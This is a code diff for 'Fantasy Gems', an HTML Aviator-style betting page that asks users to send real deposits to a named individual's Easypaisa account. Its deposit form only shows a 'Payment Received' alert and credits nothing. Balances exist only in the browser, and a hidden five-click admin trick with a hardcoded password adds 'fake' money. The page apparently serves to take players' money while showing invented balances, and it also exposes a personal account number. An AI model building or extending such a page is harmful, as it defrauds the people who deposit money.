@@ -3,64 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fantasy Gems - Admin Control</title>
+    <title>Fantasy Gems - Talha Control</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background: #010409; color: white; font-family: sans-serif; }
+        body { background: #010409; color: white; font-family: sans-serif; overflow-x: hidden; }
         .btn-gold { background: linear-gradient(90deg, #ffc107, #ff9800); color: black; font-weight: 900; }
         .aviator-bg { background: #1b0505; height: 250px; border-radius: 20px; position: relative; overflow: hidden; border: 1px solid #3d0a0a; }
-        #plane { position: absolute; bottom: 20px; left: 20px; width: 45px; z-index: 10; }
+        #plane { position: absolute; bottom: 20px; left: 20px; width: 45px; z-index: 10; transition: all 0.1s linear; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-    <header class="p-4 flex justify-between items-center border-b border-gray-900">
-        <h1 id="adminLogo" onclick="adminTouch()" class="text-xl font-black italic text-cyan-400 cursor-pointer">FANTASY GEMS</h1>
-        <div class="bg-black px-4 py-1 rounded-full border border-gray-700">
-            <span class="text-green-500 font-bold">Rs </span><span id="balDisplay" class="font-black">0.00</span>
+    <div id="authPage" class="p-8 flex flex-col items-center justify-center min-h-screen">
+        <h1 class="text-4xl font-black italic text-cyan-400 mb-10">FANTASY GEMS</h1>
+        <div class="w-full max-w-sm space-y-4">
+            <input type="number" id="phone" placeholder="Phone Number" class="w-full bg-[#0d1117] border border-gray-800 p-4 rounded-xl outline-none focus:border-cyan-500">
+            <input type="password" id="pass" placeholder="Password" class="w-full bg-[#0d1117] border border-gray-800 p-4 rounded-xl outline-none focus:border-cyan-500">
+            <button onclick="enterGame()" class="w-full btn-gold py-4 rounded-xl text-lg">LOGIN / REGISTER</button>
+            <p class="text-xs text-center text-gray-500 italic">Play responsibly. 18+ only.</p>
         </div>
-    </header>
-
-    <div class="p-4">
-        <div class="aviator-bg mb-4 flex items-center justify-center">
-            <div id="multiText" class="text-6xl font-black italic">1.00x</div>
-            <img id="plane" src="https://i.ibb.co/6P2T3yV/aviator-new.png">
-        </div>
-        
-        <div class="bg-[#2c2d30] p-4 rounded-3xl">
-            <input type="number" id="betAmount" value="100" class="w-full bg-black border border-gray-800 p-4 rounded-xl text-center font-black text-xl mb-4">
-            <button id="betBtn" onclick="startAviator()" class="w-full btn-gold py-4 rounded-2xl font-black text-xl">BET</button>
-        </div>
-
-        <button onclick="document.getElementById('depModal').style.display='block'" class="w-full mt-4 bg-blue-600 py-3 rounded-xl font-bold">RECHARGE (Muhammed Talha)</button>
     </div>
 
-    <div id="depModal" class="fixed inset-0 bg-black/95 z-50 p-6 hidden">
-        <h2 class="text-center font-black text-xl mb-6">DEPOSIT TO TALHA</h2>
-        <div class="bg-[#161b22] p-5 rounded-2xl mb-6 border border-gray-800">
-            <p class="text-xs text-gray-500 font-bold">ACCOUNT NAME: MUHAMMED TALHA</p>
-            <p class="text-2xl font-black text-cyan-400">03179774144</p>
+    <div id="gamePage" class="hidden">
+        <header class="p-4 flex justify-between items-center border-b border-gray-900 sticky top-0 bg-[#010409] z-50">
+            <h1 id="adminLogo" onclick="adminTouch()" class="text-xl font-black italic text-cyan-400 cursor-pointer">FANTASY GEMS</h1>
+            <div class="bg-black px-4 py-1 rounded-full border border-gray-700">
+                <span class="text-green-500 font-bold">Rs </span><span id="balDisplay" class="font-black text-white text-lg">0.00</span>
+            </div>
+        </header>
+
+        <div class="p-4">
+            <div class="aviator-bg mb-4 flex items-center justify-center">
+                <div id="multiText" class="text-6xl font-black italic text-white drop-shadow-lg">1.00x</div>
+                <img id="plane" src="https://i.ibb.co/6P2T3yV/aviator-new.png">
+            </div>
+            
+            <div class="bg-[#161b22] p-4 rounded-3xl border border-gray-800">
+                <div class="flex justify-between mb-2 px-2 text-xs font-bold text-gray-400">
+                    <span>AMOUNT</span>
+                    <span>BALANCE: Rs <span id="innerBal">0.00</span></span>
+                </div>
+                <input type="number" id="betAmount" value="100" class="w-full bg-black border border-gray-800 p-4 rounded-xl text-center font-black text-2xl text-yellow-500 mb-4 outline-none">
+                <button id="betBtn" onclick="startAviator()" class="w-full btn-gold py-4 rounded-2xl font-black text-2xl shadow-lg">BET</button>
+            </div>
+
+            <button onclick="toggleModal('depModal', true)" class="w-full mt-6 bg-blue-600 hover:bg-blue-700 py-4 rounded-xl font-black text-white text-lg shadow-xl uppercase tracking-widest">Deposit Now</button>
         </div>
-        <input type="text" id="tid" placeholder="Enter Transaction ID" class="w-full bg-[#0d1117] border border-gray-800 p-4 rounded-xl mb-4">
-        <button onclick="userSubmit()" class="w-full btn-gold py-4 rounded-xl">SUBMIT PAYMENT</button>
+    </div>
+
+    <div id="depModal" class="fixed inset-0 bg-black/95 z-[100] p-6 hidden">
+        <div class="flex justify-between items-center mb-8">
+            <h2 class="font-black text-2xl">RECHARGE WALLET</h2>
+            <button onclick="toggleModal('depModal', false)" class="text-3xl text-gray-500">&times;</button>
+        </div>
+        <div class="bg-gradient-to-br from-green-900 to-black p-6 rounded-3xl border border-green-500/30 mb-8">
+            <p class="text-sm text-green-400 font-bold mb-2 uppercase">Easypaisa Details</p>
+            <p class="text-xs text-gray-400 italic mb-1">Account Holder Name:</p>
+            <p class="text-xl font-bold text-white mb-4 uppercase">MUHAMMED TALHA</p>
+            <p class="text-xs text-gray-400 italic mb-1">Account Number:</p>
+            <p class="text-3xl font-black text-green-400 tracking-tighter">03179774144</p>
+        </div>
+        <input type="text" id="tid" placeholder="Enter Transaction ID (TID)" class="w-full bg-[#0d1117] border border-gray-800 p-5 rounded-2xl mb-4 text-center font-bold">
+        <button onclick="userSubmit()" class="w-full btn-gold py-5 rounded-2xl font-black text-xl shadow-lg">SUBMIT PAYMENT</button>
+        <p class="mt-6 text-center text-gray-500 text-sm italic">Funds will be added within 5-10 minutes after verification.</p>
     </div>
 
     <script>
         let balance = 0;
         let clickCount = 0;
 
+        function toggleModal(id, show) {
+            document.getElementById(id).classList.toggle('hidden', !show);
+        }
+
+        function enterGame() {
+            const p = document.getElementById('phone').value;
+            if(p.length < 10) return alert("Please enter a valid mobile number.");
+            document.getElementById('authPage').classList.add('hidden');
+            document.getElementById('gamePage').classList.remove('hidden');
+        }
+
         // --- ADMIN SECRET TRICK ---
-        // Logo par 5 baar click karne se paise dalne ka option aaye ga
         function adminTouch() {
             clickCount++;
             if(clickCount >= 5) {
-                let password = prompt("Enter Admin Password:");
-                if(password === "talha786") { // Aapka secret password
-                    let amount = prompt("Kitne fake pese dalne hain?");
+                let password = prompt("ADMIN ACCESS: Enter Secret Password:");
+                if(password === "talha786") {
+                    let amount = prompt("Admin Muhammed Talha, kitne fake pese dalne hain?");
                     if(amount) {
                         balance += parseFloat(amount);
                         updateUI();
-                        alert("Done! Rs " + amount + " added to account.");
+                        alert("Success! Rs " + amount + " added to user wallet.");
                     }
                 }
                 clickCount = 0;
@@ -69,32 +103,41 @@
 
         function updateUI() {
             document.getElementById('balDisplay').innerText = balance.toFixed(2);
+            document.getElementById('innerBal').innerText = balance.toFixed(2);
         }
 
         function userSubmit() {
-            alert("Sent! Please wait 5 minutes for Muhammed Talha to verify.");
-            document.getElementById('depModal').style.display = 'none';
+            const tid = document.getElementById('tid').value;
+            if(tid.length < 5) return alert("Please enter a valid Transaction ID.");
+            alert("Payment Received! Please wait, Muhammed Talha is verifying your transaction...");
+            toggleModal('depModal', false);
         }
 
         // Aviator Logic
         function startAviator() {
             let bet = parseFloat(document.getElementById('betAmount').value);
-            if(balance < bet) return alert("Pese khatam! Deposit karo.");
+            if(balance < bet) return alert("In-sufficient Balance. Please Recharge.");
             
             balance -= bet; updateUI();
             let m = 1.0;
             let btn = document.getElementById('betBtn');
             btn.innerText = "CASH OUT";
-            btn.style.background = "orange";
+            btn.style.background = "linear-gradient(90deg, #ff5722, #f44336)";
 
-            let crash = (Math.random() * 2 + 1.1).toFixed(2);
+            let crash = (Math.random() * 3 + 1.1).toFixed(2);
+            let plane = document.getElementById('plane');
+            
             let fly = setInterval(() => {
-                m += 0.05;
+                m += 0.03;
                 document.getElementById('multiText').innerText = m.toFixed(2) + "x";
+                plane.style.bottom = (20 + (m * 15)) + "px";
+                plane.style.left = (20 + (m * 20)) + "px";
+
                 if(m >= crash) {
                     clearInterval(fly);
-                    document.getElementById('multiText').innerHTML = "<span class='text-red-500'>LOST!</span>";
+                    document.getElementById('multiText').innerHTML = "<span class='text-red-600'>LOST!</span>";
                     btn.innerText = "BET"; btn.style.background = "";
+                    plane.style.bottom = "20px"; plane.style.left = "20px";
                 }
             }, 100);
 
@@ -102,9 +145,10 @@
                 clearInterval(fly);
                 balance += (bet * m);
                 updateUI();
-                document.getElementById('multiText').innerHTML = "<span class='text-green-500'>WIN!</span>";
+                document.getElementById('multiText').innerHTML = "<span class='text-green-500'>WIN! " + (bet*m).toFixed(0) + "</span>";
                 btn.innerText = "BET"; btn.style.background = "";
                 btn.onclick = startAviator;
+                plane.style.bottom = "20px"; plane.style.left = "20px";
             };
         }
     </script>
